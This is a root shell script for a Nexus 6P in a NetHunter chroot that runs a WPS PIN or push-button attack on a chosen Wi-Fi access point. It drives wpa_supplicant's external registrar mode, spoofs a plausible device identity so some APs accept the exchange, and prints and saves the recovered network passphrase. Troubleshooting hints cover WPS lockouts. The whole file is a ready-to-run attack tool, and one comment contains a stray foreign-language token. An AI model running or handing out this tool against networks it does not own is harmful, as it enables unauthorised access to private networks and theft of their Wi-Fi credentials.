#!/system/bin/sh
# wps-pin.sh — WPS PIN attack on the Nexus 6P (angler) ON-BOARD BCM4358,
# the right way for a fullmac chip.
#
# Why not reaver?  reaver/bully drive WPS from a monitor interface and build
# the association themselves with raw injected frames -- which only works if
# the card ACKs the AP's unicast replies in hardware (Atheros / rtl88xxau).
# The BCM4358 is a FULLMAC chip: it associates and ACKs in firmware, but only
# in managed (STA) mode, not monitor mode. So on this chip WPS must be driven
# through the firmware's native association via wpa_supplicant's WPS
# registrar (EAP-WSC M1..M8) -- no monitor mode, no injection, internal chip
# only, and the hardware ACKs正常.
#
#   Usage:
#     ./wps-pin.sh -b AA:BB:CC:DD:EE:FF              # try the default 12345670
#     ./wps-pin.sh -b <bssid> -p 12345670           # specific 8-digit PIN
#     ./wps-pin.sh -b <bssid> -P                     # PBC (push-button) instead
#     ./wps-pin.sh -b <bssid> -i wlan0 -c 11         # pin iface / hint channel
#     ./wps-pin.sh -d                                # stop wpa_supplicant we own
#
# Requires root, run from the Kali/NetHunter chroot. Uses ONLY the on-board
# BCM4358 (wlan0) in managed mode. Reports each step in English.

IFACE=wlan0
BSSID=""
PIN="12345670"
PBC=0
CHAN=""
ACTION="run"
CTRL=/var/run/wpa_supplicant_wps
CONF=/data/local/tmp/wps_supplicant.conf
PIDF=/data/local/tmp/wps_supplicant.pid

while [ $# -gt 0 ]; do
    case "$1" in
        -b) BSSID="$2"; shift 2 ;;
        -p) PIN="$2"; shift 2 ;;
        -P) PBC=1; shift ;;
        -i) IFACE="$2"; shift 2 ;;
        -c) CHAN="$2"; shift 2 ;;
        -d) ACTION="down"; shift ;;
        -h|--help)
            echo "Usage: $0 -b BSSID [-p PIN | -P] [-i iface] [-c chan] | -d"
            exit 0 ;;
        *) echo "[!] Unknown option: $1"; exit 1 ;;
    esac
done

ok()   { echo "[+] $*"; }
info() { echo "[*] $*"; }
warn() { echo "[!] $*"; }
die()  { echo "[x] $*"; exit 1; }
have() { command -v "$1" >/dev/null 2>&1; }

[ "$(id -u)" = "0" ] || die "must run as root"

WCLI="$(command -v wpa_cli || echo /system/bin/wpa_cli)"
WSUP="$(command -v wpa_supplicant || echo /system/bin/wpa_supplicant)"

stop_ours() {
    if [ -f "$PIDF" ]; then
        kill "$(cat "$PIDF")" 2>/dev/null
        rm -f "$PIDF"
    fi
    # also drop a stray instance bound to our private ctrl dir
    pkill -f "$CTRL" 2>/dev/null
}

if [ "$ACTION" = "down" ]; then
    info "Stopping our wpa_supplicant instance..."
    stop_ours
    ok "Done."
    exit 0
fi

[ -n "$BSSID" ] || die "need -b BSSID (e.g. -b 40:D6:3C:B8:CD:72)"
have "$WSUP" || die "wpa_supplicant not found"
have "$WCLI" || die "wpa_cli not found"

echo "=== Nexus 6P (BCM4358) native WPS via wpa_supplicant ==="
info "Target BSSID : $BSSID"
[ "$PBC" = 1 ] && info "Method       : PBC (push-button)" || info "Method       : PIN $PIN"
info "Interface    : $IFACE (managed mode, on-board chip)"

# 1. The on-board chip must be in normal (managed) mode, NOT monitor. If a
#    wlan0mon exists from an earlier airmon/iw session, that uses the same
#    radio -- warn, since it will fight wpa_supplicant.
if ip link show wlan0mon >/dev/null 2>&1 || iw dev 2>/dev/null | grep -q 'type monitor'; then
    warn "a monitor interface exists on this radio; WPS needs managed mode."
    warn "stop it first:  airmon-ng stop wlan0mon   (or: iw dev wlan0mon del)"
fi

# 2. Make sure Android's own wpa_supplicant isn't holding wlan0; we run our
#    own private instance on a separate control socket so we don't fight it.
info "Bringing $IFACE up..."
ip link set "$IFACE" up 2>/dev/null
sleep 1

# 3. Minimal supplicant config with WPS enabled.
mkdir -p "$(dirname "$CONF")" "$CTRL" 2>/dev/null
cat > "$CONF" <<EOF
ctrl_interface=$CTRL
update_config=1
# A real-looking enrollee identity helps some APs accept the WSC exchange.
device_name=Nexus6P
manufacturer=Google
model_name=Nexus6P
model_number=H1512
config_methods=label display push_button keypad
EOF

# 4. Start our own wpa_supplicant on the on-board chip (nl80211).
stop_ours
info "Starting wpa_supplicant on $IFACE (nl80211)..."
"$WSUP" -B -i "$IFACE" -D nl80211 -c "$CONF" -P "$PIDF" >/dev/null 2>&1
sleep 2
if ! "$WCLI" -p "$CTRL" -i "$IFACE" ping 2>/dev/null | grep -q PONG; then
    warn "wpa_supplicant control socket not responding; retrying with wext..."
    stop_ours
    "$WSUP" -B -i "$IFACE" -D wext -c "$CONF" -P "$PIDF" >/dev/null 2>&1
    sleep 2
    "$WCLI" -p "$CTRL" -i "$IFACE" ping 2>/dev/null | grep -q PONG \
        || die "wpa_supplicant did not come up on $IFACE"
fi
ok "wpa_supplicant is up (ctrl=$CTRL)."

WC() { "$WCLI" -p "$CTRL" -i "$IFACE" "$@"; }

# 5. Scan so the target BSS is known (helps WPS lock onto the right channel).
info "Scanning for $BSSID ..."
WC scan >/dev/null 2>&1
sleep 5
if WC scan_results 2>/dev/null | grep -qi "$BSSID"; then
    ok "Target found in scan results."
else
    warn "target not seen in scan yet; continuing anyway."
fi

# 6. Run the WPS exchange through the firmware's native association.
echo
if [ "$PBC" = 1 ]; then
    info "Starting WPS PBC (you have ~2 min; press the AP's WPS button)..."
    WC wps_pbc "$BSSID"
else
    info "Starting WPS PIN registrar exchange (EAP-WSC M1..M8)..."
    # wps_reg = act as registrar with the AP's PIN (external registrar attack)
    out="$(WC wps_reg "$BSSID" "$PIN" 2>&1)"
    echo "    $out"
    echo "$out" | grep -qi "OK" || warn "wps_reg was not accepted; see status below."
fi

# 7. Watch the result for up to ~30s: success prints the PSK/credential.
info "Waiting for the WSC result (up to 30s)..."
n=0
while [ $n -lt 30 ]; do
    st="$(WC status 2>/dev/null)"
    if echo "$st" | grep -qi "wpa_state=COMPLETED"; then
        echo
        ok "Associated / WPS completed. Credential:"
        WC status 2>/dev/null | grep -iE 'ssid|key_mgmt|wpa_state'
        # the negotiated PSK lands in the config when update_config=1
        WC save_config >/dev/null 2>&1
        grep -iE 'ssid|psk' "$CONF" 2>/dev/null | sed 's/^/    /'
        echo
        ok "Done. PSK saved in $CONF"
        exit 0
    fi
    sleep 1
    n=$((n+1))
done

echo
warn "No WSC success within the timeout. Useful next checks:"
warn "  - confirm WPS is enabled and not locked on the AP (wash -i wlan0mon"
warn "    on the dongle, or check the 'Lck' column)"
warn "  - some APs rate-limit/lock WPS after failed PINs (wait, then retry)"
warn "  - live status:  wpa_cli -p $CTRL -i $IFACE status"
warn "  - live log:     wpa_cli -p $CTRL -i $IFACE log_level DEBUG; then watch dmesg/logcat"
info "Stop our instance when done:  $0 -d"
exit 1
